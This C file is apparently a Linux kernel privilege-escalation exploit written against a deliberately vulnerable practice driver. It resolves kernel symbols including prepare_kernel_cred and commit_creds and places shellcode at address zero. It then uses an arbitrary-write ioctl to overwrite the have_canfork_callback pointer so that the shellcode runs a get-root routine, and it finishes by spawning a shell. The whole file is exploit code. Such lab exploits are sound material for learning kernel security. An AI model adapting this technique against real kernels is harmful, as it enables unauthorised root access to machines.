#define _GNU_SOURCE
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <time.h>

#include "../src/vuln_driver.h"
#include "../src/ckx_structs.h"

int main(){
    unsigned long addr;
    char buffer[10] = "12345";
    // addr = get_kernel_sym(av[1]);

    addr = get_kernel_sym("have_canfork_callback");
    printf("src is %p\n", buffer);
    write_args_ckx ws;


    //设置写的源地址指针，写的目标地址指针，还有写的长度
    ws.buff = buffer;
    ws.to = (char *)addr;
    printf("to is %lx\n", ws.to);
    ws.count = 2;

    /* get function address */

    //addr = get_kernel_sym("have_canfork_callback");

    prepare_kernel_cred = (prepare_kernel_cred_t)get_kernel_sym("prepare_kernel_cred");
    commit_creds = (commit_creds_t)get_kernel_sym("commit_creds");
    ckx_escaperoot = (void *)get_kernel_sym("ckx_escaperoot");
   

    unsigned char shellcode[] =
        {/*0x48, 0xC7, 0xC0, 0x5A, 0xF4, 0xF3, 0x81, */ /*0x48, 0xC7, 0x00, 0x00, 0x00, 0x00, 0x00,*/ 0x48, 0xB8, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0xFF, 0xD0, 0x48, 0x31, 0xC0, 0xC3};
    /* insert the getroot address to shellcode */
    void **get_root_offset = rawmemchr(shellcode, 0x42);
    (*get_root_offset) = escape;
    memcpy(0, shellcode, sizeof(shellcode));

    getchar();


    int fd = open("/dev/vulnerable_device", O_RDWR);
    unsigned int ret;

    ret = ioctl(fd, ARBITRARY_RW_WRITE_USER_CKX,&ws);

    get_shell();
}
